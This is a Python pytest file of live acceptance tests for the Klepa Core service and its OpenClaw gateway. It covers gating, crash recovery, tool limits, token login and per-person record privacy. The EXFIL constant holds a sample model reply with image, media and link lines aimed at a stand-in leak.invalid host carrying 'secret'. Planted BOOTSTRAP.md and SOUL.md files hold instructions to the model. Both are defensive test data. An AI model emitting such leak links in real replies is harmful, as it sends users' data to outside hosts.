"""Acceptance scenarios of stage 1c against the REAL OpenClaw gateway, run by Core under launchd (spec 13.2:
scenarios 16, 40, 41, 43; docs/architecture.md: Testing).

They need an installed runtime and run only when KLEPA_TEST_RUNTIME names it (the folder `host install` fills,
for example "$HOME/Library/Application Support/Klepa/openclaw"); CI has none. Every test loads its own launchd
agent under a label of its own, from a plist in the test's folder, and unloads it at the end. The runtime is only
read: the test's own runtime folder links to its Node and OpenClaw. The model's token is a dummy and the egress
proxy lets no model call out; stage 1 blocks every turn before the model anyway.
"""

import asyncio
import contextlib
import dataclasses
import json
import os
import re
import secrets
import signal
import subprocess
from pathlib import Path

import pytest

import fakemodel
from helpers import BASE_CONFIG, MEMBER, OWNER, free_port, query, wait_until, with_service_bot
from klepa_core import app as core_app
from klepa_core import db
from klepa_core.app import init_layout, run_service
from klepa_core.host import gateway as gw
from klepa_core.host import install as host
from klepa_core.host import reference
from klepa_core.host import runtime as rt

RUNTIME = os.environ.get("KLEPA_TEST_RUNTIME")
pytestmark = pytest.mark.skipif(not RUNTIME, reason="needs KLEPA_TEST_RUNTIME: an installed host runtime")
STUB = "STUB: "
NO_COMMANDS = "I have no commands. Just write to me in words."
DUMMY_TOKEN = "sk-ant-oat01-TEST-ONLY-NOT-A-TOKEN-" + "x" * 64


@dataclasses.dataclass
class Live:
    cfg: object
    telegram: object
    alerts: object
    core: asyncio.Task
    stop: asyncio.Event
    label: str

    def states(self):
        rows = query(self.cfg, "SELECT data FROM event_log WHERE kind='host_state' ORDER BY id")
        return [json.loads(row["data"]) for row in rows]

    def state(self):
        states = self.states()
        return states[-1]["state"] if states else None

    def agent(self) -> gw.AgentState:
        return gw.parse_print(gw._run(["launchctl", "print", f"gui/{os.getuid()}/{self.label}"]))

    def sent(self):
        return [item["params"].get("text", "") for item in self.telegram.sent]


def linked_runtime(folder: Path) -> rt.Runtime:
    """A runtime of the test's own that reads the installed Node and OpenClaw."""
    real = rt.Runtime(Path(RUNTIME))
    runtime = rt.Runtime(folder)
    folder.mkdir(mode=0o700)
    for path in (real.node_dir, real.openclaw_dir):
        (folder / path.name).symlink_to(path)
    return runtime


@contextlib.asynccontextmanager
async def live_stand(
    make_config,
    install,
    fake_tg,
    service_tg,
    short_dir,
    monkeypatch,
    *,
    table_change=None,
    model=None,
    before_start=None,
):
    own_model = model is None  # stage 2: the gate's model probe needs a model, so every stand has one
    if own_model:
        model = fakemodel.FakeModel()
        await model.start()
    label = f"klepa.gateway.test-{secrets.token_hex(4)}"
    monkeypatch.setattr(gw, "LABEL", label)
    monkeypatch.setattr(gw, "_run", rt._run)  # the real launchctl, for this agent only
    runtime = linked_runtime(install["tmp"] / "runtime")
    section = (
        f'\n[host]\nsocket = "{short_dir / "run" / "adapter.sock"}"\nruntime_dir = "{runtime.root}"\n'
        f"api_port = {free_port()}\nproxy_port = {free_port()}\ngateway_port = {free_port()}\n"
    )
    text = with_service_bot(BASE_CONFIG, install["service_token_file"], service_tg.url) + section
    cfg = make_config(api_root=fake_tg.url, text=text)
    if True:  # the scripted model, reached through the egress proxy like the real one
        cfg = dataclasses.replace(cfg, host=dataclasses.replace(cfg.host, model=fakemodel.MODEL))
        table_change = (table_change or {}) | fakemodel.provider_table(model.url)
        proxy, loopback = core_app.EgressProxy, ("127.0.0.1", model.port)
        monkeypatch.setattr(
            core_app,
            "EgressProxy",
            lambda port, allow, gatekeeper, *a, **k: proxy(port, allow, [*gatekeeper, loopback], *a, **k),
        )
    init_layout(cfg)
    conn = db.connect(cfg.core_db_path)
    conn.execute("INSERT INTO service_binding(person_id, chat_id, bound_at) VALUES ('owner', ?, 't')", (OWNER,))
    conn.close()
    if table_change is not None:
        monkeypatch.setattr(reference, "FIXED", reference.FIXED | table_change)
    host.install(cfg, say=lambda line: None, exclude=lambda path: None)
    host.login(cfg, DUMMY_TOKEN)
    if before_start is not None:
        before_start(cfg)
    stop = asyncio.Event()
    core = asyncio.create_task(run_service(cfg, stop, copy_interval=0.2, retry_seconds=1.0, documents_grace=0.0))
    current = Live(cfg, fake_tg, service_tg, core, stop, label)
    try:
        yield current
    finally:
        current.stop.set()  # a test may have started Core again
        await asyncio.wait_for(current.core, 30)
        rt._run(["launchctl", "bootout", f"gui/{os.getuid()}/{label}"])
        await wait_until(lambda: not current.agent().loaded, timeout=30)  # the gateway drains for a few seconds
        if own_model:
            await model.stop()


@pytest.fixture
def stand_args(make_config, install, fake_tg, service_tg, short_dir, monkeypatch):
    return make_config, install, fake_tg, service_tg, short_dir, monkeypatch


async def test_the_real_gateway_passes_the_gate_and_answers_with_cores_text(stand_args):
    async with live_stand(*stand_args) as live:
        await wait_until(lambda: live.state() == "RUNNING", timeout=90)
        assert live.agent().process is not None
        live.telegram.add_text(MEMBER, "hello")
        await wait_until(lambda: "STUB: hello" in live.sent(), timeout=40)
        assert not [text for text in live.sent() if "could not be sent" in text]
        assert [alert for alert in live.alerts.sent if "host" in alert["params"]["text"]] == []


async def test_a_crashed_gateway_is_checked_again_before_it_gets_messages(stand_args):
    """Scenario 41: launchd brings a killed gateway back; Core sees a new process and gates it again."""
    async with live_stand(*stand_args) as live:
        await wait_until(lambda: live.state() == "RUNNING", timeout=90)
        before = live.agent().process
        os.kill(before.pid, signal.SIGKILL)
        await wait_until(lambda: live.state() == "STARTING", timeout=20)
        assert live.states()[-1]["reason"] in ("new_process", "new_boot")
        live.telegram.add_text(MEMBER, "while it restarts")
        await wait_until(lambda: live.state() == "RUNNING", timeout=90)
        assert live.agent().process.pid != before.pid
        await wait_until(lambda: "STUB: while it restarts" in live.sent(), timeout=40)
        assert live.sent().count("STUB: while it restarts") == 1


async def test_a_gateway_unloaded_behind_cores_back_comes_back_with_an_alert(stand_args):
    async with live_stand(*stand_args) as live:
        await wait_until(lambda: live.state() == "RUNNING", timeout=90)
        rt._run(["launchctl", "bootout", f"gui/{os.getuid()}/{live.label}"])
        await wait_until(lambda: any("stopped by itself" in a["params"]["text"] for a in live.alerts.sent), timeout=30)
        await wait_until(lambda: live.state() == "RUNNING" and live.agent().process is not None, timeout=90)


async def test_without_conversation_access_the_gateway_never_gets_messages(stand_args):
    """Scenario 16, a plugin loaded without allowConversationAccess: OpenClaw drops the turn hooks, Core sees it in
    the gateway's log and stops the gateway."""
    change = {"plugins.entries.klepa-adapter.hooks.allowConversationAccess": False}
    async with live_stand(*stand_args, table_change=change) as live:
        await wait_until(lambda: live.state() == "STOPPED", timeout=120)
        reason = live.states()[-1]["reason"]
        assert "blocked" in reason or reason in (
            "probe",
            "heartbeat:policy:plugins.entries.klepa-adapter.hooks.allowConversationAccess",
        )
        live.telegram.add_text(MEMBER, "anyone there?")
        await asyncio.sleep(3)
        assert not [text for text in live.sent() if text.startswith(STUB)]
        assert not live.agent().loaded


async def test_the_model_has_only_cores_tools(stand_args):
    """Scenario 40: `sessions_history`, `session_status`, `x_search`, `view_image`, `browser`, `message` and `exec`
    are not there for the model, by the gateway's own account: it has Core's tools and nothing else."""
    async with live_stand(*stand_args) as live:
        await wait_until(lambda: live.state() == "RUNNING", timeout=90)
        cfg = live.cfg
        runtime, layout = rt.Runtime(cfg.host.runtime_dir), reference.layout_of(cfg)
        key = cfg.adapter_key_path.read_bytes()
        from klepa_core.host.adapter import probe_peer

        session = f"agent:main:telegram:direct:{probe_peer(key)}"  # the probe's session exists after the gate
        params = json.dumps({"sessionKey": session})
        answer = rt.openclaw_json(runtime, layout, "gateway", "call", "tools.effective", "--params", params)
        assert answer["profile"] == "minimal"
        listed = json.dumps(answer["groups"])
        for forbidden in ("sessions_history", "session_status", "x_search", "view_image", "browser", "message", "exec"):
            assert f'"{forbidden}"' not in listed, forbidden


async def test_core_restarts_while_its_gateway_runs(stand_args):
    """Core goes away for a minute and comes back. Its gateway kept running, polling a gatekeeper that was gone; it
    passes the start gate again within the gate's budget, without a restart of its own, and answers."""
    async with live_stand(*stand_args) as live:
        await wait_until(lambda: live.state() == "RUNNING", timeout=90)
        process = live.agent().process
        live.stop.set()
        await asyncio.wait_for(live.core, 30)
        await asyncio.sleep(60)  # the host's poller backs off against a gatekeeper that is gone
        seen = len(live.states())
        live.stop = asyncio.Event()
        live.core = asyncio.create_task(
            run_service(live.cfg, live.stop, copy_interval=0.2, retry_seconds=1.0, documents_grace=0.0)
        )
        loop = asyncio.get_running_loop()
        started = loop.time()
        await wait_until(lambda: any(s["state"] == "RUNNING" for s in live.states()[seen:]), timeout=90)
        assert [s["state"] for s in live.states()[seen:]] == ["RUNNING"]  # no failed gate on the way
        assert loop.time() - started < 30
        assert live.agent().process == process
        live.telegram.add_text(MEMBER, "after Core came back")
        await wait_until(lambda: "STUB: after Core came back" in live.sent(), timeout=40)


async def test_a_members_command_never_reaches_the_host(stand_args):
    """Scenario 43: Core answers commands itself; the gateway never sees them."""
    async with live_stand(*stand_args) as live:
        await wait_until(lambda: live.state() == "RUNNING", timeout=90)
        live.telegram.add_text(MEMBER, "/model")
        await wait_until(lambda: NO_COMMANDS in live.sent(), timeout=30)
        log = (live.cfg.host_dir / "logs" / "gateway.log").read_text()
        assert "/model" not in log


async def test_a_new_token_reaches_the_running_gateway(stand_args):
    """The owner logs in again while Core runs the gateway: the token is stored, the config stays Core's, and the
    running gateway is asked to take it at once."""
    async with live_stand(*stand_args) as live:
        await wait_until(lambda: live.state() == "RUNNING", timeout=90)
        config = (live.cfg.host_dir / "openclaw.json").read_bytes()
        assert await asyncio.to_thread(host.login, live.cfg, DUMMY_TOKEN.replace("x", "y")) is True
        assert (live.cfg.host_dir / "openclaw.json").read_bytes() == config
        assert live.state() == "RUNNING"


async def test_an_unmarked_openclaw_cannot_write_the_gateways_state(stand_args):
    """The ownership claim (spec 4.6): another OpenClaw process pointed at the engine's state, without the external
    supervision mark, is refused before it writes; the engine's own wrapper is not."""
    async with live_stand(*stand_args) as live:
        cfg = live.cfg
        runtime, layout = rt.Runtime(cfg.host.runtime_dir), reference.layout_of(cfg)
        env = rt.gateway_env(runtime, layout)
        del env["OPENCLAW_SUPERVISOR_MODE"]
        argv = rt.openclaw_argv(runtime, "models", "auth", "paste-token", "--provider", "anthropic")
        result = rt._run([*argv, "--profile-id", "anthropic:intruder"], env=env, input=DUMMY_TOKEN + "\n")
        assert result.returncode != 0
        listed = rt.openclaw_json(runtime, layout, "models", "auth", "list", "--provider", "anthropic")
        assert [profile["id"] for profile in listed["profiles"]] == ["anthropic:klepa"]


def test_the_live_tests_leave_no_agent_behind():
    out = subprocess.run(["launchctl", "list"], capture_output=True, text=True).stdout
    assert "klepa.gateway.test-" not in out


@pytest.fixture
async def fake_model():
    model = fakemodel.FakeModel()
    await model.start()
    yield model
    await model.stop()


async def test_a_persons_text_reaches_the_model_with_cores_instruction(stand_args, fake_model):
    async with live_stand(*stand_args, model=fake_model) as live:
        await wait_until(lambda: live.state() == "RUNNING", timeout=90)
        live.telegram.add_text(MEMBER, "hello there")
        await wait_until(lambda: any("STUB:" in text for text in live.sent()), timeout=60)
        answer = next(text for text in live.sent() if "STUB:" in text)
        assert answer == "STUB: hello there"
        assert "You are Klepa" in fake_model.requests[-1].system


async def test_openclaws_first_run_ritual_and_persona_never_reach_the_model(stand_args, fake_model):
    """An OpenClaw that ran before stage 2 left BOOTSTRAP.md in the workspace: Core removes it at the start, so no
    turn's prompt tells the model to follow it, and no persona file is in the prompt either."""

    def seed(cfg):
        workspace = reference.layout_of(cfg).workspace
        (workspace / "BOOTSTRAP.md").write_text("# BOOTSTRAP.md\nRITUAL-MARK: ask the human who you are.\n")
        (workspace / "SOUL.md").write_text("# SOUL.md\nSOUL-MARK: be proactive.\n")

    async with live_stand(*stand_args, model=fake_model, before_start=seed) as live:
        await wait_until(lambda: live.state() == "RUNNING", timeout=90)
        live.telegram.add_text(MEMBER, "hello there")
        await wait_until(lambda: any("STUB:" in text for text in live.sent()), timeout=60)
        system = next(request for request in fake_model.requests if "hello there" in request.human).system
        assert "You are Klepa" in system
        for mark in ("Bootstrap Pending", "RITUAL-MARK", "SOUL-MARK"):
            assert mark not in system, mark
        assert not (reference.layout_of(live.cfg).workspace / "BOOTSTRAP.md").exists()


async def test_a_provider_busy_at_the_start_lets_the_host_run_without_an_alert(stand_args, fake_model):
    """The provider answers 529 for the first 100 s, as after a night's restart. OpenClaw retries within the model
    probe's turn for about 80 s and then reports the error; the gate, with Core's own timings, waits that out, asks
    once more after its pause, and the host runs. A blip wakes nobody."""
    import time

    started = time.monotonic()
    calls = []

    def script(request):
        calls.append(round(time.monotonic() - started))
        return fakemodel.Fail(529) if time.monotonic() - started < 100 else fakemodel.Say("OK")

    fake_model.script = script
    fake_model.answer_probes = False
    async with live_stand(*stand_args, model=fake_model) as live:
        await wait_until(lambda: live.state() == "RUNNING", timeout=300)
        assert len(calls) > 2, calls  # OpenClaw's own retries, then the gate's second probe
        assert "STOPPED" not in [state["state"] for state in live.states()]
        assert not [alert for alert in live.alerts.sent if "model" in alert["params"]["text"]]


async def test_the_model_finds_a_stored_file_through_cores_signed_tool(stand_args, fake_model):
    def script(request):
        if not request.tool_results:
            return fakemodel.Call("klepa__search", {"query": "passport"})
        return fakemodel.Say("FOUND: " + request.tool_results[-1])

    fake_model.script = script
    async with live_stand(*stand_args, model=fake_model) as live:
        await wait_until(lambda: live.state() == "RUNNING", timeout=90)
        live.telegram.add_document(MEMBER, "scan.pdf", b"%PDF-1.4 test", caption="passport scan")
        await wait_until(lambda: query(live.cfg, "SELECT COUNT(*) AS n FROM evidence")[0]["n"] == 1, timeout=30)
        live.telegram.add_text(MEMBER, "where is my passport?")
        await wait_until(lambda: any("FOUND:" in text for text in live.sent()), timeout=60)
        answer = next(text for text in live.sent() if "FOUND:" in text)
        assert "scan.pdf" in answer, answer
        asked = next(request for request in fake_model.requests if "passport" in request.human)
        assert "klepa__search" in asked.tools
        assert query(live.cfg, "SELECT tool FROM host_tool_call")[0]["tool"] == "search"


EXFIL = (
    "Here it is.\nMEDIA:https://leak.invalid/a.png\n![x](https://leak.invalid/b.png)\nhttps://leak.invalid/?q=secret\n"
    "[photo](https://leak.invalid/?d=secret)\nwrite to a.b@leak.invalid or @leak_account"
)


async def test_a_reply_cannot_carry_files_links_or_lookups(stand_args, fake_model):
    """Scenario 29: whatever the model writes, the person gets text: no attachment, no preview, no active address,
    and the gateway asks the network for nothing."""
    import hashlib

    fake_model.script = lambda request: fakemodel.Say(EXFIL)
    async with live_stand(*stand_args, model=fake_model) as live:
        await wait_until(lambda: live.state() == "RUNNING", timeout=90)
        live.telegram.add_text(MEMBER, "show me")
        await wait_until(lambda: any("Here it is" in text for text in live.sent()), timeout=60)
        await asyncio.sleep(3)  # anything else the host might send
        sent = [item for item in live.telegram.sent if "Here it is" in item["params"].get("text", "")]
        assert len(sent) == 1
        params = sent[0]["params"]
        html = params["text"]
        assert "<a " not in html
        for address in ("https://leak.invalid/?q=secret", "https://leak.invalid/?d=secret", "a.b@leak.invalid"):
            assert f"<code>{address}</code>" in html, html
        assert "<code>@leak_account</code>" in html
        assert "a.png" not in html  # the MEDIA line became an attachment the gateway was told to drop
        assert params["link_preview_options"] == {"is_disabled": True}
        methods = [call for call in live.telegram.calls if call not in ("getUpdates", "getMe", "sendChatAction")]
        assert set(methods) <= {"sendMessage", "deleteWebhook", "deleteMyCommands", "getFile"}, methods
        digest = hashlib.sha256(b"leak.invalid").hexdigest()[:12]
        denied = [
            json.loads(row["data"]) for row in query(live.cfg, "SELECT data FROM event_log WHERE kind='egress_denied'")
        ]
        assert digest not in [entry["host_sha256"] for entry in denied]


async def test_a_model_that_refuses_the_token_stops_the_host_with_an_alert(stand_args, fake_model):
    """The gate's model probe: a token that stopped working is found at the start, not by a person's question."""
    fake_model.script = lambda request: fakemodel.Fail(401)
    fake_model.answer_probes = False
    async with live_stand(*stand_args, model=fake_model) as live:
        await wait_until(lambda: live.state() == "STOPPED", timeout=150)
        assert live.states()[-1]["reason"] == "model_auth"
        await wait_until(lambda: any("host login" in alert["params"]["text"] for alert in live.alerts.sent), timeout=20)
        assert fake_model.requests  # the probe did reach the model
        assert len([r for r in fake_model.requests if "Klepa start check" in r.human]) == 1  # never asked again


async def test_a_turn_the_model_fails_gives_the_person_cores_words_and_the_owner_an_alert(stand_args, fake_model):
    """OpenClaw sends its English error to the chat whatever errorPolicy says; the person reads Core's text."""

    def script(request):
        if "Klepa start check" in request.human:
            return fakemodel.Say("OK")
        return fakemodel.Fail(401)

    fake_model.script = script
    async with live_stand(*stand_args, model=fake_model) as live:
        await wait_until(lambda: live.state() == "RUNNING", timeout=90)
        live.telegram.add_text(MEMBER, "hello?")
        await wait_until(lambda: any("something broke on my side" in text for text in live.sent()), timeout=60)
        assert not [text for text in live.sent() if "request failed" in text or "HTTP 401" in text]
        await wait_until(lambda: any("got no answer" in a["params"]["text"] for a in live.alerts.sent), timeout=20)
        alert = next(a["params"]["text"] for a in live.alerts.sent if "got no answer" in a["params"]["text"])
        assert "(auth)" in alert  # the person's own turn, not a blocked probe
        assert len([a for a in live.alerts.sent if "got no answer" in a["params"]["text"]]) == 1


async def test_the_model_sends_a_person_their_original_through_core(stand_args, fake_model):
    def script(request):
        results = request.tool_results
        if not results:
            return fakemodel.Call("klepa__search", {"query": "passport"})
        if len(results) == 1:
            found = json.loads(results[0])["results"][0]["id"]
            return fakemodel.Call("klepa__send_original", {"id": found})
        return fakemodel.Say("SENT: " + results[-1])

    fake_model.script = script
    async with live_stand(*stand_args, model=fake_model) as live:
        await wait_until(lambda: live.state() == "RUNNING", timeout=90)
        live.telegram.add_document(MEMBER, "Διαβατήριο scan.pdf", b"%PDF-1.4 original bytes", caption="passport")
        await wait_until(lambda: query(live.cfg, "SELECT COUNT(*) AS n FROM evidence")[0]["n"] == 1, timeout=30)
        live.telegram.add_text(MEMBER, "send me my passport")
        await wait_until(lambda: live.telegram.documents, timeout=60)
        document = live.telegram.documents[0]
        assert document["name"] == "Διαβατήριο scan.pdf"
        assert document["data"] == b"%PDF-1.4 original bytes"
        assert int(document["params"]["chat_id"]) == MEMBER
        await wait_until(lambda: any("SENT:" in text for text in live.sent()), timeout=30)
        # The stored file is gone: the model is told "sent" when Core queues it, and the person then hears from Core
        stored = query(live.cfg, "SELECT incoming_path FROM evidence")[0]["incoming_path"]
        (live.cfg.incoming_dir / stored).unlink()
        live.telegram.add_text(MEMBER, "send it again please")
        notice = "I couldn't send the file Διαβατήριο scan.pdf"
        await wait_until(lambda: any(notice in text for text in live.sent()), timeout=60)
        assert len(live.telegram.documents) == 1


async def test_a_direct_call_of_cores_tools_through_the_gateway_is_refused(stand_args):
    """/tools/invoke has no turn: the gateway denies Core's tools there, and Core runs nothing."""
    import aiohttp

    async with live_stand(*stand_args) as live:
        await wait_until(lambda: live.state() == "RUNNING", timeout=90)
        token = reference.layout_of(live.cfg).gateway_token.read_text().strip()
        url = f"http://127.0.0.1:{live.cfg.host.gateway_port}/tools/invoke"
        body = {"tool": "klepa__search", "args": {"query": "passport"}}
        headers = {"Authorization": f"Bearer {token}"}
        async with aiohttp.ClientSession() as session, session.post(url, json=body, headers=headers) as response:
            status, answer = response.status, await response.text()
        assert status != 200 or '"ok":false' in answer.replace(" ", ""), (status, answer[:300])
        assert query(live.cfg, "SELECT COUNT(*) AS n FROM host_tool_call")[0]["n"] == 0


async def test_a_message_in_the_middle_of_a_turn_gets_its_own_turn(stand_args, fake_model):
    """Scenario 31: with the followup queue a message that arrives while the model thinks waits for its own
    before_agent_run; both are answered, in order."""
    fake_model.script = lambda request: fakemodel.Say(
        f"STUB: {request.human}", delay=6 if "first" in request.human else 0
    )
    async with live_stand(*stand_args, model=fake_model) as live:
        await wait_until(lambda: live.state() == "RUNNING", timeout=90)
        live.telegram.add_text(MEMBER, "first")
        await wait_until(lambda: any(r.human == "first" for r in fake_model.requests), timeout=30)
        live.telegram.add_text(MEMBER, "second")
        await wait_until(lambda: "STUB: second" in live.sent(), timeout=60)
        answers = [text for text in live.sent() if text.startswith("STUB: ")]
        assert answers == ["STUB: first", "STUB: second"], answers
        rows = query(live.cfg, "SELECT data FROM event_log WHERE kind='turn_registered'")
        people = [json.loads(row["data"]) for row in rows if not json.loads(row["data"])["probe"]]
        assert len([entry for entry in people if not entry.get("model_probe")]) == 2


async def test_a_turn_cut_by_a_crash_is_answered_once_after_the_restart(stand_args, fake_model):
    """Scenario 32: the gateway dies while the model thinks; launchd brings it back, its own queue runs the turn
    again, Core registers it by the message still without an answer, and the person gets one answer."""
    slow = {"on": True}
    fake_model.script = lambda request: fakemodel.Say("STUB: recovered", delay=30 if slow["on"] else 0)
    async with live_stand(*stand_args, model=fake_model) as live:
        await wait_until(lambda: live.state() == "RUNNING", timeout=90)
        live.telegram.add_text(MEMBER, "question")
        await wait_until(lambda: any(r.human == "question" for r in fake_model.requests), timeout=30)
        slow["on"] = False
        os.kill(live.agent().process.pid, signal.SIGKILL)
        await wait_until(lambda: "STUB: recovered" in live.sent(), timeout=120)
        await asyncio.sleep(5)
        assert live.sent().count("STUB: recovered") == 1


async def test_a_persons_private_records_stay_theirs(stand_args, fake_model):
    """Scenario 18: the tools act for the person whose message the turn answers, so another member's personal
    records are never found, even when both ask at once."""

    def script(request):
        if not request.tool_results:
            return fakemodel.Call("klepa__search", {"query": "insurance"})
        names = [found["name"] for found in json.loads(request.tool_results[-1])["results"]]
        return fakemodel.Say("FOUND: " + ", ".join(sorted(names)))

    fake_model.script = script
    async with live_stand(*stand_args, model=fake_model) as live:
        await wait_until(lambda: live.state() == "RUNNING", timeout=90)
        keyword = live.cfg.locale.private_keywords[0]
        live.telegram.add_document(OWNER, "owner-insurance.pdf", b"%PDF owner", caption=f"insurance {keyword}")
        live.telegram.add_document(MEMBER, "shared-insurance.pdf", b"%PDF shared", caption="insurance")
        await wait_until(lambda: query(live.cfg, "SELECT COUNT(*) AS n FROM evidence")[0]["n"] == 2, timeout=30)
        live.telegram.add_text(MEMBER, "find insurance")
        live.telegram.add_text(OWNER, "find insurance")
        await wait_until(lambda: len([t for t in live.sent() if t.startswith("FOUND:")]) == 2, timeout=90)
        plain = {i["params"]["chat_id"]: re.sub(r"</?code>", "", i["params"]["text"]) for i in live.telegram.sent}
        by_chat = {chat: text for chat, text in plain.items() if text.startswith("FOUND:")}
        assert by_chat[MEMBER] == "FOUND: shared-insurance.pdf"
        assert by_chat[OWNER] == "FOUND: owner-insurance.pdf, shared-insurance.pdf"
